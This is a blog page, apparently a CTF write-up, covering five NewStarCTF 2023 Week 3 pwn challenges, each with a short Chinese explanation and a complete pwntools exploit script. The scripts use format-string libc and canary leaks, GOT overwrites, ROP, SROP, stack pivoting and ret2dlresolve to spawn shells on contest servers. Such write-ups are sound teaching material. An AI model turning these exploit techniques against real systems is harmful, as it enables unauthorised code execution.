@@ -1,0 +1,780 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>NewStarCTF 2023 [WEEK 3] PWN | Xzzzz911</title>
+    <meta name="author" content="Xzzzz911" />
+    <meta name="description" content="This is my website Hello Everyone" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/123.jpg" />
+    
+    <!-- Font Awesome 图标库 -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
+    
+    <!-- 你自己的自定义样式 -->
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <!-- 自定义样式：一定要放在 style.css 之后，确保覆盖生效 -->
+    <link rel="stylesheet" href="/css/custom.css">
+    
+    <!-- 主题内部样式或脚本导入 -->
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+
+<script>const mixins = {};</script>
+
+
+  <script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+
+
+
+
+
+  <script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+  
+  
+  
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+    
+    <!-- 强制全局固定背景样式，优先级高 -->
+    <style>
+        html {
+        background-image: url("/images/1.jpg") !important;
+        background-size: cover !important;
+        background-attachment: fixed !important;
+        background-position: center center !important;
+        background-repeat: no-repeat !important;
+        min-height: 100vh !important;
+        }
+    
+        body {
+        background: transparent !important;
+        min-height: 100vh !important;
+        }
+    
+        #home-background {
+        display: none !important;  /* 隐藏 ParticleX 自带的顶部背景图区域 */
+        }
+
+        #content-inner,
+        .page,
+        .post-block,
+        .main-inner {
+        background: rgba(255, 255, 255, 0.3) !important; /* 半透明方便透出背景 */
+        border-radius: 10px;
+        padding: 20px;
+        }
+    </style>
+<meta name="generator" content="Hexo 7.3.0"></head>
+      
+<body>
+
+    <!-- ✅ 全站背景图容器（新增） -->
+    <div id="global-bg"></div>
+
+    <div id="layout" v-cloak>
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>XZZZZ911</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;关于</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;存档</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;分类</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;标签</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;XZZZZ911</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">关于</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">存档</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">分类</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <!-- ✅ 页面标题和标签 --> 
+
+<div class="post-title-area">
+  <h1 style="color: #b6b4b4; font-size: 2.5rem; font-weight: bold; margin-bottom: 0.5rem;">NewStarCTF 2023 [WEEK 3] PWN</h1>
+  <div class="info" style="font-size: 0.95rem; color: #555;">
+    <span class="date">
+      <span class="icon"><i class="fa-solid fa-calendar fa-fw"></i></span>
+      2023/10/28
+    </span>
+    
+    <span class="category" style="margin-left: 1rem;">
+      <a href="/categories/CTF/">
+        <span class="icon"><i class="fa-solid fa-bookmark fa-fw"></i></span>
+        CTF
+      </a>
+    </span>
+    
+    
+    <span class="tags" style="margin-left: 1rem;">
+      <span class="icon"><i class="fa-solid fa-tags fa-fw"></i></span>
+      
+      
+      <span class="tag">
+        
+        <a href="/tags/PWN/" style="color: #ffa2c4; margin-right: 0.5rem;">PWN</a>
+      </span>
+      
+      <span class="tag">
+        
+        <a href="/tags/NewStarCTF/" style="color: #00a596; margin-right: 0.5rem;">NewStarCTF</a>
+      </span>
+      
+    </span>
+    
+  </div>
+</div>
+
+
+
+<div id="home-posts-wrap" class="home-posts-wrap" style="display: flex; max-width: 1200px; margin: auto; gap: 2rem;">
+  <div id="home-posts" style="opacity: 0.5; flex: 3;">
+    <div class="post">
+      
+        <div class="content" v-pre>
+          <p>NewStarCTF 2023 [WEEK 3] PWN</p>
+<span id="more"></span>
+
+<h1 id="简介"><span id="简介">简介：</span></h1><p>这周时间不是很充裕，没有来得及做，题目真的逐渐变难，很多不是很了解的知识点逐渐暴露，这些知识点理解起来也挺难的，慢慢来，别急，加油！！！</p>
+<hr>
+<h2 id="puts-or-system"><span id="puts-or-system">puts or system?</span></h2><p>查看一下保护机制，打开了 canary 和 NX，还有一个点就是 RELRO（注意一下，因为这题需要修改 got 表），开启了部分说明 got,plt 可读可写，不懂的可以看（PWN PWN PWN !!! 技巧 (1)）</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/1.png"></p>
+<p>ida 反汇编一下，看看伪代码，发现发生了溢出和格式字符串漏洞，还有一个重要的点就是 <code>puts(&quot;/bin/sh&quot;)</code>，我们肯定得想办法变成 <code>system(&quot;/bin/sh&quot;)</code>，这样的话就可以获得 shell，所以我们就可以用到 pwntools 里面的工具 <code>fmtstr_payload</code> 来把 puts 的 got 地址修改成 system 的地址，那我们就先通过 <code>%s</code> 的方法来泄露 libc 从而来获得 system 的地址，这样就可以获得 shell 了（这种泄露 libc 的方法可以记一下）</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/2.png"></p>
+<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/3.png"></p>
+<p>exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26095</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(0/1)\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%9$sAAAA&#x27;</span> + p64(got_addr)   <span class="comment"># 对齐</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;There is my gift:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(0/1)\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">8</span>, &#123;got_addr: sys_addr&#125;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What\&#x27;s it\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="orw-amp-rop"><span id="orw-amp-rop">orw &amp; rop</span></h2><p>查看一下保护机制，跟上题一样的保护机制，根据题目就知道是开启了沙盒，不能使用 execve 调用，需要自己构造 orw 去获得 flag</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/4.png"></p>
+<p>ida 一下，发现有个沙盒，并且开辟了一块可读可写的区域 <code>0x66660000</code>，还发生格式字符串漏洞和栈溢出，可通过格式字符串漏洞，把 canary 和 libc 泄露出来，然后就是套 canary 的模板（可见 PWN PWN PWN !!! 技巧 (1)）</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/5.png"></p>
+<p>运行程序，发现偏移为 6，并且 canary 为第 11 个参数，可通过 puts 函数来泄露 libc，然后就是通过寄存器把参数传进去，最后就可以直接构造 orw</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/6.png"></p>
+<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/7.png"></p>
+<p>exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python复制编辑<span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ezorw&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28531</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%11$p%8$saaaaaaa&#x27;</span> + p64(got_addr)     <span class="comment"># 对齐</span></span><br><span class="line">p.sendafter(<span class="string">&quot;sandbox\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)     <span class="comment"># canary = int(p.recv()[2:18],16)</span></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ret      = libc_base + <span class="number">0x2a264</span> </span><br><span class="line">pop_rdi  = libc_base + <span class="number">0x2a3e5</span> </span><br><span class="line">pop_rsi  = libc_base + <span class="number">0x2be51</span> </span><br><span class="line">pop_rdx  = libc_base + <span class="number">0x90529</span>     </span><br><span class="line">pop_rax  = libc_base + <span class="number">0x45eb0</span> </span><br><span class="line">read     = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]     <span class="comment"># elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(ret) \</span><br><span class="line">    + p64(pop_rdi) + p64(<span class="number">0</span>) \</span><br><span class="line">    + p64(pop_rsi) + p64(<span class="number">0x66660000</span>) \</span><br><span class="line">    + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(read) \</span><br><span class="line">    + p64(<span class="number">0x66660000</span>)   <span class="comment"># 套路，你应该懂吧</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,<span class="number">0x66660200</span>,<span class="number">0x100</span>)</span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,<span class="number">0x66660200</span>,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">p.send(asm(orw_shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="srop"><span id="srop">srop</span></h2><p>老规矩查看一下保护机制，只打开了 NX，并且是 full RELRO（got.plt 均不可读可写），不懂可看 PWN PWN PWN !!! 技巧 (1)，srop 的方法可以套模板，利用系统调用号（可以看看这里 PWN PWN PWN !!! 技巧 (3)）</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/8.png"></p>
+<p>ida 一下，发现发生了栈溢出，但溢出长度不够构造 rop，因此需要栈迁移。这类题目格式模板化，就是考察你 srop 的用法，套模板，注意一些参数就行，后续我会更新该题型模板，敬请期待！</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/9.png"></p>
+<p>exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29475</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">syscall = elf.plt[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">rdi     = <span class="number">0x401203</span></span><br><span class="line">lea     = <span class="number">0x401171</span>              <span class="comment"># lea     rax, [rbp+var_30]</span></span><br><span class="line">bss     = <span class="number">0x404050</span> + <span class="number">0x500</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome to srop!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">59</span></span><br><span class="line">frame.rsi = bss - <span class="number">0x30</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rcx = <span class="number">0</span></span><br><span class="line">frame.rsp = bss + <span class="number">0x38</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + flat(bss, lea)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + flat(rdi,<span class="number">15</span>,syscall,frame)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="stack-migration-revenge"><span id="stack-migration-revenge">stack migration revenge</span></h2><p>查看一下保护机制，打开了 NX</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/10.png"></p>
+<p>ida 反汇编，你会发现相较上一周的栈迁移题，这次需要自己构造迁移地点，难度上升一个档次，理解较难。我理解是在 read 地址写入 rop，再栈迁移到 bss 段，剩下套路。注意接收，这真的很坑，掉几次！☻☻☻</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/11.png"></p>
+<p>exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26731</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr   = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">plt_addr   = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">bss        = elf.bss(<span class="number">0x700</span>)       <span class="comment"># 0x404100</span></span><br><span class="line">rdi_addr   = <span class="number">0x4012b3</span></span><br><span class="line">rbp_addr   = <span class="number">0x40115d</span></span><br><span class="line">leave_ret  = <span class="number">0x401227</span></span><br><span class="line">ret_addr   = <span class="number">0x40101a</span></span><br><span class="line">read       = <span class="number">0x4011FF</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;just chat with me:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span> + p64(bss +<span class="number">0x50</span>) + p64(read)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;so funny\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(rdi_addr) + p64(got_addr) + p64(plt_addr)</span><br><span class="line">payload += p64(rbp_addr) + p64(bss +<span class="number">0x800</span>) + p64(read)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(bss -<span class="number">0x8</span>) + p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;so funny\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr   = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh     = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(bss +<span class="number">0x800</span> -<span class="number">0x58</span>) + p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="dlresolve"><span id="dlresolve">dlresolve</span></h2><p>这题是 ret2dlresolve 的解法，在比赛中较少碰到，我第一次接触，原理还在理解中，先挂官方 WP：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27108</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vuln_addr = <span class="number">0x401170</span></span><br><span class="line">plt0 = <span class="number">0x401020</span>  <span class="comment"># plt 段地址</span></span><br><span class="line">bss = <span class="number">0x404040</span></span><br><span class="line">bss_stage = bss + <span class="number">0x100</span></span><br><span class="line">l_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>] - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x000000000040115e</span>    <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000040116b</span>    <span class="comment"># pop rsi ; ret # 用于解析符号 dl_runtime_resolve</span></span><br><span class="line">plt_load = p64(plt0 + <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr, known_func_ptr, offset</span>):</span><br><span class="line">    linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))  <span class="comment"># l_addr</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">    linkmap += p64(<span class="number">0x7</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(known_func_ptr - <span class="number">0x8</span>)</span><br><span class="line">    linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>)</span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, read_got, l_addr)</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">120</span>,</span><br><span class="line">    pop_rdi, <span class="number">0</span>,</span><br><span class="line">    pop_rsi, bss_stage,</span><br><span class="line">    read_plt,</span><br><span class="line">    pop_rsi, <span class="number">0</span>,</span><br><span class="line">    pop_rdi, bss_stage + <span class="number">0x48</span>,</span><br><span class="line">    plt_load, bss_stage, <span class="number">0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(fake_link_map)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="总结"><span id="总结">总结：</span></h1><p>这次题目确实上了一个档次，有些东西确实也不太好理解，慢慢来，积少成多，相同题型放一起总结，总会得出好的结论，就一句话：多做多总结，冲冲冲！！！</p>
+
+        </div>
+      
+    </div>
+  </div>
+
+  
+    <div id="home-card" style="opacity: 0.5; flex: 1; position: relative;">
+      <div class="profile-card-fixed">
+        <div id="card-style">
+  <div id="card-div">
+
+    <!-- 头像区域整体包裹 -->
+    <div class="card-header">
+      <!-- 头像，添加外层相对定位 -->
+      <div class="avatar">
+        <img src="/images/123.jpg" alt="avatar" />
+
+        <!-- 右下角小标注 -->
+        <div class="author-status-sidebar" tabindex="0" aria-label="认真摸鱼中">
+          <g-emoji class="g-emoji" alias="palm_tree" fallback-src="https://lskypro.acozycotage.net/LightPicture/2022/12/fe1dc0402e623096.jpg">🐟</g-emoji>
+          <span class="status-text">认真摸鱼中</span>
+        </div>
+      </div>
+
+      <!-- 作者名 -->
+      <div class="name">Xzzzz911</div>
+
+      <!-- 描述（支持 markdown） -->
+      <div class="description">
+        <p>越努力 越幸运</p>
+
+      </div>
+
+      <!-- 图标链接 -->
+      
+      <div class="icon-links">
+        
+        <span class="icon-link">
+          <a href="https://github.com/xzz911" title="来访问我的GitHub吧" target="_blank" rel="noopener noreferrer">
+            <i class="fa-brands fa-github fa-fw"></i>
+          </a>
+        </span>
+        
+        <span class="icon-link">
+          <a href="https://wpa.qq.com/msgrd?v=3&amp;uin=443602796&amp;site=qq&amp;menu=yes" title="QQ: 443602796" target="_blank" rel="noopener noreferrer">
+            <i class="fa-brands fa-qq fa-fw"></i>
+          </a>
+        </span>
+        
+        <span class="icon-link">
+          <a href="mailto:xzzzz911@qq.com" title="邮件发送我" target="_blank" rel="noopener noreferrer">
+            <i class="fa-solid fa-envelope fa-fw"></i>
+          </a>
+        </span>
+        
+        <span class="icon-link">
+          <a href="https://space.bilibili.com/1709777759" title="B站主页" target="_blank" rel="noopener noreferrer">
+            <i class="fa-brands fa-bilibili fa-fw"></i>
+          </a>
+        </span>
+        
+      </div>
+      
+
+      <!-- 友链 -->
+      
+    </div>
+
+    <!-- 新增访客信息卡片，只在首页显示 -->
+    
+
+    <!-- ✅ 卡片 2：今日诗词（仅首页展示），加了分割样式 -->
+    
+
+    <!-- TOC 目录区域 -->
+    
+
+  </div>
+</div>
+
+      </div>
+      <div class="card-sticky-wrapper">
+        <div id="toc-container">
+          <div class="toc-header">
+            <i class="fa-solid fa-list-ul"></i> 目录
+          </div>
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#puts-or-system"><span class="toc-number">1.1.</span> <span class="toc-text">puts or system?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#orw-amp-rop"><span class="toc-number">1.2.</span> <span class="toc-text">orw &amp; rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#srop"><span class="toc-number">1.3.</span> <span class="toc-text">srop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-migration-revenge"><span class="toc-number">1.4.</span> <span class="toc-text">stack migration revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dlresolve"><span class="toc-number">1.5.</span> <span class="toc-text">dlresolve</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结：</span></a></li></ol>
+        </div>
+      </div>
+    </div>
+  
+</div>
+
+<!-- 修改过的上一篇/下一篇导航 -->
+<div class="post-nav-outer" style="max-width: 1200px; margin: 3rem auto 0; display: flex; justify-content: center;">
+  <div class="post-nav-inner" style="flex: 3; display: flex; gap: 1rem;">
+    
+      <a href="/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" style="flex: 1; text-decoration: none; color: #ccc;">
+        <div>
+          <div style="font-size: 0.85rem; color: #492630;">⬅ 上一篇</div>
+          <div style="font-weight: bold; font-size: 1.1rem; margin-top: 0.3rem;">2024年度总结：保持正念 延迟满足</div>
+          <div style="font-size: 0.85rem; margin-top: 0.5rem;">
+            <i class="fa fa-calendar"></i> 2024-12-31
+            
+              &nbsp;| <i class="fa fa-folder-open"></i> 
+            
+            
+              &nbsp;| <i class="fa fa-tags"></i>
+              
+                奋进
+              
+            
+          </div>
+        </div>
+      </a>
+    
+
+    
